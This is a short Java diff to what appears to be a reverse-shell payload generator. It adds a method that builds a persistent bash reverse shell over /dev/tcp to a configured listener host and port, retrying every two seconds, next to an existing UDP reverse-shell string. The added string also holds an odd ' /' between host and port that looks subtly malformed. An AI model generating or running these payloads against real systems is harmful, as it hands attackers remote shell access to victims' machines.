@@ -26,6 +26,11 @@ public class ReverseController {
         return str;
     }
 
+    public static  String ReverseBashTCP4(){
+        String str = "bash -c \"while true; do bash -i >& /dev/tcp/" + menuBeanListener.getLhost() + " /" + menuBeanListener.getLport() + "  0>&1; sleep 2; done\"";
+        return str;
+    }
+
     public static String ReverseBashUDPVictim() {
         String str = "sh -i >& /dev/udp/" + menuBeanListener.getLhost() + "/" + menuBeanListener.getLport() + " 0>&1";
         return str;
